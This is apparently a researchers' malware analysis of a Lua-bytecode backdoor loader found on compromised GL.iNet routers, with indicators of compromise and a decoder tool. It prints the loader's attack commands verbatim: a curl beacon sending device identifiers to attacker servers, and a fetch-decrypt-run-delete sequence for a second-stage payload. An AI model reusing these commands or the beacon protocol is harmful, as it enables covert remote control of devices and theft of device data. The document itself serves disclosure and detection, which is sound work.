# The older backdoor: the loader (`/bin/ulogd`)

## In short

Some compromised GL.iNet routers carry a small hidden program saved as `/bin/ulogd`. It is the
**first stage** of an older backdoor — a "loader" whose only job is to phone home on a schedule and,
when told to, download and run a second program. It is written in compiled Lua (a scripting language
built into the router firmware) and its text is obfuscated so that it reveals nothing when you run
`strings` on it.

What it does, in plain terms:

- Every few days it sends a small report ("beacon") about the router to one of a few servers the
  attacker controls. The report includes the router's serial number, MAC address, model, firmware
  version, and similar identifying details.
- The server can reply with a download instruction. The loader then fetches a second program,
  decrypts it, runs it in the background, and **deletes it from disk within about a second** — so the
  second stage leaves no file behind, only a running process.
- It can be told to stop (a "quit" switch), and it is told how long to wait before the next beacon.

What it means for an owner of an affected router: the device has been reporting to an outside server,
possibly for months, and the operator could have pushed further software to it at any time. The
loader itself does not change your VPN, password or firewall files. The second stage it fetches
is a general remote-control program; it is deleted from disk after it starts, but we copied it
from the running process and describe it on [its own page](older-backdoor-second-stage.md).

This page describes the loader exactly, so other researchers can find and confirm it. Everything here
comes from **static analysis** — reading the bytes of the samples and the memory of the running
process. **Nothing was executed and nothing was fetched from any server.**

Scope of our evidence: **49 loader samples** and **47 memory images** of the loader running, taken
from routers we manage or own before the malware was removed. Affected models in this set were the
GL-MT2500, GL-MT3000, GL-MT6000, GL-AX1800 and GL-AXT1800, on firmware versions ranging from 4.7.0
to 4.11.0.

---

## 1. What the file is, and why standard tools refuse it

**How it is known: Verified** (read in all 49 samples).

`/bin/ulogd` is a Lua 5.1 **bytecode** file — the compiled form of a Lua script. It was built with
the LNUM-patched Lua that ships in OpenWrt (the Linux distribution GL.iNet firmware is based on),
not stock Lua. Two differences from stock Lua 5.1 make the standard disassemblers (`luac -l`,
`unluac`) reject it:

- The 12-byte file header is `1b4c75615100010404040804`. Byte 11 is `04` (the size of the integer
  type) where stock Lua carries a "number is integral" flag.
- Numeric constants can use an extra constant type tag (`9`, a 4-byte little-endian integer) that
  stock Lua does not have.

The instruction set is otherwise stock Lua 5.1. A purpose-built parser handles the two differences;
see the tool in [`tools/ulogd-decode/`](../tools/ulogd-decode/) (§12).

There are two builds, distinguished by file size:

| Build | Size (bytes) | Samples | Servers |
|-------|-------------|---------|---------|
| two-server | 33,722 | 42 | 2 |
| three-server | 35,745 | 7 | 3 |

Every sample has a different SHA-256, because each carries a per-device identifier (§5). Apart from
that identifier and the server list, the two builds are byte-for-byte the same program.

**How it is installed and run (Verified by us on the affected routers).** Five lines are added to the
start-up script `/etc/init.d/urandom_seed`. They copy the Lua interpreter `/usr/bin/lua` to
`/usr/bin/monitord`, copy `/bin/ulogd` to `/var/run/monitord.pid`, run
`/usr/bin/monitord /var/run/monitord.pid &`, wait two seconds, then delete `/var/run/monitord.pid`
(the copy of the loader). The interpreter copy at `/usr/bin/monitord` **remains**. So the running
process is the stock Lua interpreter, renamed `monitord`, executing the loader's bytecode from a file
that no longer exists on disk. The names `ulogd`, `monitord` and `monitord.pid` are chosen to look
like the router's real logging daemon (`ulogd`) and an ordinary monitoring daemon.

---

## 2. How the text is hidden

**How it is known: Verified** (reimplemented and run against all 49 samples).

Every sensitive string — file paths, server URLs, shell commands, field names — is returned by its
own small function that rebuilds the text one character at a time, so the plain string never appears
in the file.

Each such function builds a fixed table of records and then loops over them. For an ordinary text
string, each record is a 4-tuple `{value, position, operation, key}`, and the stored character byte
`c` is recovered from `value` and `key` according to `operation`:

```
operation "add":  c = value - key
operation "sub":  c = value + key
operation "xor":  c = value XOR key     (bitwise exclusive-or)
```

("XOR", exclusive-or, is a reversible bit operation: applying the same key twice returns the original
value.) The bitwise XOR is computed by a tiny helper function that walks the bits using `% 2`, `* 2`
and `math.floor(x / 2)`. The `position` field gives each character its place in the output, so the
records can be stored in any order; the function ends with `table.concat` to join them.

The XOR key string itself (§3) is built by a slightly different function whose records are
`{value, position}` pairs, choosing the operation per position from constants held in the code, and
formatting each byte with `"%02x"`.

This is enough to reimplement the de-obfuscation. Our public tool does exactly this: it reads, from
each function's instructions, which record field is the value, which is the position, which is the
key, and which operation each branch applies, and refuses any function whose shape it does not
recognise — it never guesses the arithmetic.

This confirms the mechanism that forum users worked out first: UnhappyCloud
([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)) and rdizzie ([post 39](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/39)).

---

## 3. The obfuscation key, and how it is applied

**How it is known: Verified** (decoded in all 49 samples; confirmed against memory).

All 49 samples use the same 64-hex-character key:

```
fe9d8e6705d3338031c2f3ab8d0cd0e7a929c8ab977d0e696dfe905e05f0f37b
```

It is applied as the **32 bytes those hex digits represent** (not as the 64 ASCII characters). The
cipher function first hex-decodes the key string into 32 bytes, then XORs message byte `i` with key
byte number `((i − 1) mod 32) + 1` — a repeating 32-byte XOR. This is confirmed empirically: those 32
bytes XOR-decode the beacons found in the memory images into readable text that begins `counter=`
(§9), which would not work if the key were the 64 ASCII characters.

The beacon sent to the server is `uppercase-hex( XOR( beacon_text, key ) )`: the loader XORs the
report, then encodes the result as upper-case hexadecimal. The server's reply is the inverse — the
loader hex-decodes the first line of the response, XOR-decrypts it with the same key, and parses the
result as JSON.

---

## 4. The servers

**How it is known: Verified** (decoded in all 49 samples).

The loader has two or three server addresses depending on the build. These are the only five server
names across all samples; no others appear.

| Build | Server addresses |
|-------|------------------|
| two-server (33,722 bytes) | `https://cdn.adguardns.com/v1/gl/access` <br> `https://cdn.adguardns.org/v1/gl/access` |
| three-server (35,745 bytes) | `https://cdn.lede-openproject.org/v1/gl/access` <br> `https://cdn.adxinsight.com/v1/gl/access` <br> `https://cdn.openwrt-project.org/v1/gl/access` |

The beacon path is `/v1/gl/access` on every host. At start-up the loader randomises the order of its
server list (using `math.randomseed(os.time())` and a shuffle), so no one server is "primary"; it
tries them in a fresh random order each run and stops at the first that answers.

The build a sample uses does **not** depend on the router model or firmware: both builds appear on
the same models and overlapping firmware versions. **Inferred:** the two-/three-server split is a
build or batch difference, not something chosen per device.

---

## 5. The per-device identifier

**How it is known: Verified** (49 distinct values across 49 samples; checked against memory on 47).

The one thing that differs between two samples of the same size is a single **40-hex-character
identifier**, of the form `<40 hex>`, stored as a plain (non-hidden) string. It is sent in the
beacon as the `randomkey` field. Within each build, every other byte is identical; this identifier
sits in a roughly 40-byte window and is the only per-sample change.

**This identifier is assigned by the attacker, per router — it is not derived from the device and it
is not the same on every device.** Our 49 samples carry 49 different values. It is not a hash of any
device field: we compared each router's in-memory `randomkey` against the MD5, SHA-1 and SHA-256 of
every other beacon field, in several spellings, on all 47 memory images, and found no match. So it is
an attacker-chosen tag that lets the operator tell one router from another.

This **extends** what forum users found. Romer ([post 19](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/19)) and rdizzie
([post 40](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/40)) each give one such identifier, read from one file, and rdizzie
([post 39](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/39)) worked out that it changes between builds. With 49 files side by side we can
say more: it is different on every router, and the value they quote is not among our 49. We do not
publish the per-device identifiers.

The only other per-device value anywhere is the download token the server issues at tasking time
(§9), which exists only in the server's reply, not in the sample. Every other embedded value — key,
server names, paths, the protocol version `v2.1`, the second-stage name and password — is the same
on every device.

---

## 6. The beacon, field by field

**How it is known: Verified** (read in both builds; matches the decrypted beacons in memory, §9).

The report is assembled with a single format string and sent as 16 `name=value` pairs joined by `&`,
in this exact order:

| # | Field | What it is | Where the loader gets it |
|---|-------|-----------|--------------------------|
| 1 | `counter` | check-in number, starts at 1, +1 each beacon | internal counter |
| 2 | `randomkey` | the attacker's per-device identifier `<40 hex>` | baked into the sample (§5) |
| 3 | `uptime` | seconds since boot | `/proc/uptime` |
| 4 | `ptsnum` | number of pseudo-terminals open | listing of `/dev/pts` |
| 5 | `ppid` | parent process id | `/proc/self/status` (`PPid:`) |
| 6 | `sn` | device serial number | `/proc/gl-hw-info/device_sn` |
| 7 | `endian` | `little` or `big` | byte order read from the ELF header of `/bin/ls` |
| 8 | `arch` | CPU architecture, e.g. `aarch64` | `uname -m` |
| 9 | `macs` | all network-interface MAC addresses | `/sys/class/net/*/address` |
| 10 | `errno` | status of the previous check-in (see §7) | internal |
| 11 | `mac` | device MAC address | `/proc/gl-hw-info/device_mac` |
| 12 | `ddns` | device dynamic-DNS name | `/proc/gl-hw-info/device_ddns` |
| 13 | `model` | model string, e.g. `mt3000` | `/proc/gl-hw-info/model` |
| 14 | `firmware` | firmware type (empty on the routers seen) | `/proc/gl-hw-info/firmware_type` |
| 15 | `glversion` | firmware version, e.g. `4.7.4` | `/etc/glversion` |
| 16 | `version` | malware protocol version, constant `v2.1` | baked into the sample |

The format string, identical in both builds:

```
%s=%d&%s=%s&%s=%s&%s=%d&%s=%d&%s=%s&%s=%s&%s=%s&%s=%s&%s=%d&%s=%s&%s=%s&%s=%s&%s=%s&%s=%s&%s=%s
```

Files the loader **reads** to build the report: `/proc/uptime`, `/dev/pts` (listing),
`/proc/self/status`, `/proc/gl-hw-info/device_sn`, `/bin/ls` (first bytes of the ELF header, to learn
byte order), `/sys/class/net` and each interface's `address`, `/proc/gl-hw-info/device_mac`,
`/proc/gl-hw-info/device_ddns`, `/proc/gl-hw-info/model`, `/proc/gl-hw-info/firmware_type`, and
`/etc/glversion`. It runs `uname -m`. It reads no VPN configuration, key material or Wi-Fi file.

The report is sent to each server in turn with this command (one per server, with `sleep 5` between
attempts, stopping at the first that returns output):

```
curl -fsSkL --connect-timeout 10 -X POST -d "<UPPERCASE-HEX>" "<server-url>" -w "\n%{http_code}\n"
```

`-fsSkL` includes `-k` (TLS certificate checking disabled) and `-L` (follow redirects).

There is also a decoded field `islogin` that is built but never used — dead code.

---

## 7. The reply, and the error codes

**How it is known: Verified** (read in the loader's main loop).

The server's reply is a JSON object. The loader reads six fields, each with a default if missing:

| Field | Default | Meaning |
|-------|---------|---------|
| `url` | `""` | where to download the second stage |
| `sleep` | `5` (and raised to `1` if `0`) | seconds to wait before the next beacon |
| `key` | `""` | password to decrypt the second stage (empty means it is a plain program) |
| `args` | `""` | command-line arguments for the second stage |
| `quit` | false | if true, the loader exits immediately (`os.exit()`) — a remote off switch |
| `name` | `""` | file name to save the second stage as |

The loop reports the outcome of the previous iteration in the next beacon's `errno` field:

| `errno` | Meaning |
|---------|---------|
| 0 | normal |
| 1 | no server answered the beacon |
| 2 | the reply was not valid JSON |
| 3 | the reply had no `url` — an "idle" reply, nothing to do |

When there is no usable reply (`errno` 1 or 2), the loader waits **7200 seconds (2 hours)** — this
is the built-in fallback interval, held as the hidden string `sleep 7200`. Otherwise it waits for the
number of seconds the server sent (§9: the live servers sent 259200, three days).

Before the first beacon, if the router has been up for less than 600 seconds, the loader waits 300
seconds — a pause for the router to finish booting. (The beacon still reports the uptime measured
before that pause.)

---

## 8. The second stage: fetch, decrypt, run, delete

**How it is known: Verified** (read in the loader; the commands match those found in memory, §9).

When a reply carries a non-empty `url`, the loader downloads and installs the second stage. The
commands it builds, in order (`<name>` is the reply's `name` field, `<url>` its `url`, `<key>` its
`key`):

1. If `/tmp/<name>` already exists, delete it.
2. Download: `curl -fsSkL --connect-timeout 10 -o /tmp/<name> <url>`
3. Check the download opened and is not zero bytes.
4. **If `key` is empty**, the download is a plain program: `chmod +x /tmp/<name>`, then go to step 7.
5. **If `key` is set**, the download is an encrypted ZIP archive. Decrypt it:
   ```
   openssl enc -d -aes-256-cbc -pbkdf2  -salt -in "/tmp/<name>" -out "/tmp/<name>.zip" -k "<key>"
   ```
   (Two spaces between `-pbkdf2` and `-salt`, as in the sample.) Then delete the encrypted file.
6. Unzip and make executable: `unzip -o "/tmp/<name>.zip" -d /tmp`, delete the ZIP, `chmod +x /tmp/<name>`.
7. Install and launch:
   - `ln -s "/tmp/<name>" "/usr/sbin/<name>"` (a symbolic link in a system directory)
   - kill any copy already running: `ps | grep "/usr/sbin/<name>" | grep -v grep | awk '{print $1}'`
     then `kill -9` each
   - launch in the background, output discarded:
     `"/usr/sbin/<name>" <args> >/dev/null 2>&1 &` (or without `<args>` if none)
   - wait 1 second
   - `rm -f "/tmp/<name>"` and `rm -f "/usr/sbin/<name>"`

So the second stage runs from `/usr/sbin/<name>` (a link to the `/tmp` copy), and about one second
later **both the `/tmp` file and the `/usr/sbin/` link are deleted**. The process keeps running with
no file left on disk. This confirms and sharpens the "both deleted after one second" observation from
the community analysis: it is the payload file and the symbolic link that are removed, not the
running process.

---

## 9. What the servers actually sent (from 47 memory images)

**How it is known: Verified** (recovered from the writable memory of 47 running loaders).

We captured the memory of the loader process on 47 routers. In every one we found the loader's own
beacon and at least one reply from the server. The 32-byte key (§3) decrypted the in-memory beacons
to readable text beginning `counter=`, which is the main proof that our decoder and key are correct.

Two kinds of reply were seen:

- **Idle reply** — no task:
  `{"url":"","sleep":259200,"key":"","args":"","quit":false,"name":""}`
  (sometimes with `url` simply absent). The loader records `errno=3`, waits, and beacons again.
- **Tasking reply** — download the second stage:
  ```
  {"url":"https://<server>/v1/gl/download?token=<16 characters>",
   "sleep":259200,"key":"JHWmVqTwEryeXiAyXwEnCmKrQvRtnpxV","args":"","quit":false,"name":"ujaild"}
  ```

Across all replies recovered from the 47 images:

| Field | Value seen |
|-------|-----------|
| `name` | `ujaild` (on tasking replies) or empty (idle) |
| `key` (second-stage password) | `JHWmVqTwEryeXiAyXwEnCmKrQvRtnpxV` — the same on every tasking reply |
| `sleep` | `259200` (three days) on every reply |
| `quit` | `false` on every reply — no device was told to stop |
| `args` | empty on every reply |
| HTTP status | `200` wherever a status line was captured |

- The second stage is named **`ujaild`** and is delivered as an AES-256-CBC-encrypted ZIP; its
  password, `JHWmVqTwEryeXiAyXwEnCmKrQvRtnpxV`, is the same across the whole set. The file is
  deleted after it starts (§8), so it is not on disk and not in the loader's memory. We copied the
  running program from its own process on each router; see
  [the second stage](older-backdoor-second-stage.md).
- The download path is `/v1/gl/download`, with a per-router token of the form
  `?token=<16 characters>` (letters and digits). The token is attacker-issued per router; we do not
  publish the real values.
- Of the 47 images, **26** contained a tasking reply naming `ujaild`; on **24** of those the full
  download-to-launch command sequence (download, decrypt, unzip, chmod, symlink, kill, launch,
  remove) was still present in memory. The other **21** images held only idle replies.

The `sleep 7200` seen by the community in one sample and `sleep 259200` in another are **both
correct and not a contradiction**: 7200 seconds is the loader's built-in fallback, used only when no
valid reply arrives; 259200 seconds is what the live servers actually sent. This explains
[forum posts 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)
and [22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22) (UnhappyCloud and HubertCumberdale).

### How long had the routers been reporting?

Each beacon carries a `counter` that starts at 1 when the loader process starts and rises by one at
every check-in. The largest `counter` we saw in memory was **138**, on a GL-MT2500 on firmware
4.7.13.

**Inferred, arithmetic the reader can check:** at a three-day (259,200-second) interval, 137 earlier
check-ins would span `(138 − 1) × 259,200 = 35,510,400` seconds ≈ **411 days**. But that same
router's capture shows its loader process had been running `18,114,175 − 2,338,833 = 15,775,342`
seconds ≈ **183 days** (uptime minus the process's start time after boot) — less than 411 days. So
the interval was not a steady three days: the average gap was shorter, consistent with the 2-hour
fallback kicking in during connectivity failures. The firm lower bound from that router's own clock
is therefore about **183 days — roughly six months** of reporting. We do not claim longer than the
numbers support.

---

## 10. What the loader does NOT do

**How it is known: Verified** (no such string exists in either build's decoded text).

The loader contains no reference to — and so does not write — any of:

- `/etc/config/wireguard_server`
- `/etc/passwd` or `/etc/shadow`
- anything under `/lib/upgrade/keep.d`
- `cron`, `crontab`, or `rc.local`

The only system service it touches is the log service, which it restarts once at start-up
(`/etc/init.d/log restart`). It writes only `/tmp/<name>`, `/tmp/<name>.zip` and the
`/usr/sbin/<name>` link, all of which it deletes (§8).

Routers in this incident show the file `/etc/config/wireguard_server` rewritten about 11 seconds
after the loader is installed. **The loader does not do that.** The second stage holds no such
code either: a search of both of its builds for `wireguard` and `/etc/config` finds nothing
([second stage](older-backdoor-second-stage.md)). That leaves whatever installed the backdoor, or
a command given afterwards. One owner with weekly backups reports that the rewrite left the
file's content unchanged
([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)).

The loader has one dead function that would run `ps | grep "nginx" | ...` to kill a process named
`nginx`; it is defined but never called.

---

## 11. Where this confirms or corrects the community analysis

The community reverse-engineering in
[this forum thread](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097)
got the mechanism substantially right. Our independent analysis of 49 samples and 47 memory images:

- **Confirms:** the LNUM Lua 5.1 build that standard tools refuse; the `{value, position, operation,
  key}` string hiding; the data collected; the `curl` beacon to `/v1/gl/access`; the 32-byte XOR key
  and that it is the value above; the JSON reply schema; and the `openssl` / `unzip` / symlink /
  launch / delete handling of the second stage.
- **Extends (posts 19, 39, 40):** the 40-hex identifier is different on **every** router; the one
  value quoted there is one device's (§5).
- **Explains (posts 14 and 22):** the two check-in intervals — 7200 seconds is the built-in fallback,
  259200 seconds is what the live servers sent (§9).

---

## 12. Reproduce it yourself

A standalone decoder is in
[`tools/ulogd-decode/decode_ulogd.py`](../tools/ulogd-decode/decode_ulogd.py) (Python 3, standard
library only, GPL-3.0-or-later). It parses the bytecode and rebuilds the hidden strings without running anything
from the sample. Run it on a captured `ulogd` file:

```
python3 -I tools/ulogd-decode/decode_ulogd.py <ulogd-file>
```

It prints the file size and SHA-256, the server URLs, the beacon fields, the sleep interval, the
version string (`v2.1`), the 40-hex identifier, and the XOR key, then every decoded hidden string and
every plain string constant. Other modes:

- `--json` — the same information as JSON
- `--strings` — the hidden strings in program order, with where each is used
- `--disasm` — an annotated listing of every function

It exits with a non-zero status and a clear message on any file it cannot parse, and contains no
value specific to any one device.

### Indicators

| Indicator | Value |
|-----------|-------|
| Loader path | `/bin/ulogd` |
| Running process | `/usr/bin/monitord /var/run/monitord.pid` (interpreter renamed `monitord`) |
| File type / header | Lua 5.1 bytecode, header `1b4c75615100010404040804` |
| File sizes | 33,722 bytes (two-server) or 35,745 bytes (three-server) |
| Beacon servers | `cdn.adguardns.com`, `cdn.adguardns.org`, `cdn.lede-openproject.org`, `cdn.adxinsight.com`, `cdn.openwrt-project.org` |
| Beacon path | `/v1/gl/access` |
| Download path | `/v1/gl/download?token=<16 characters>` |
| Second stage name | `ujaild` |
| Second-stage ZIP password | `JHWmVqTwEryeXiAyXwEnCmKrQvRtnpxV` |
| Obfuscation key | `fe9d8e6705d3338031c2f3ab8d0cd0e7a929c8ab977d0e696dfe905e05f0f37b` |
| Protocol version | `v2.1` |
| Start-up marker | five added lines in `/etc/init.d/urandom_seed` copying `/usr/bin/lua`→`/usr/bin/monitord` and `/bin/ulogd`→`/var/run/monitord.pid` |

### Limits of this analysis

This is static analysis only. We read the loader's bytecode and the memory of loaders that had
already run; we did not execute any sample and did not contact any server. The second stage is
described separately. We could not determine what rewrites `/etc/config/wireguard_server` at
install time; it is neither the loader nor anything we found in the second stage.

---

*Added 23 November 2026. Part of [the incident pages](../README.md). Times are UTC.*
